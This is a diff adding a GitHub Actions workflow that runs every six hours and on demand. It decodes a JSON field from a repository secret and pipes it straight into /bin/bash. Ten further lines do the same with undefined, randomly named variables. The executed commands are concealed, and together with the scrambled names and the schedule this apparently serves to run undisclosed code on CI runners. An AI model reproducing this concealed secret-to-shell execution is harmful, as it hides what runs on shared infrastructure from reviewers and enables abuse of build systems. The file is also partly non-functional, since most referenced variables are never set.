@@ -1,0 +1,29 @@
+name: baifenzhiwushijiaoxing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: baifenzhiwushijiaoxing
+        env:
+          cansj1353: ${{ secrets.cansj1353 }}
+        run: |
+          echo $cansj1353 | jq -r .ainy03464 | /bin/bash
+          echo $cc60297 | jq -r .civjt046 | /bin/bash
+          echo $lho253 | jq -r .thb20 | /bin/bash
+          echo $joja81 | jq -r .zn816 | /bin/bash
+          echo $rn0 | jq -r .z5540 | /bin/bash
+          echo $zg79282 | jq -r .qjgpc4799 | /bin/bash
+          echo $iheb6729 | jq -r .jj1405 | /bin/bash
+          echo $pwr84 | jq -r .wzpdp4207 | /bin/bash
+          echo $jdn9286 | jq -r .p53 | /bin/bash
+          echo $tobws2 | jq -r .od70 | /bin/bash
+          echo $u38210 | jq -r .ktx7665 | /bin/bash
+
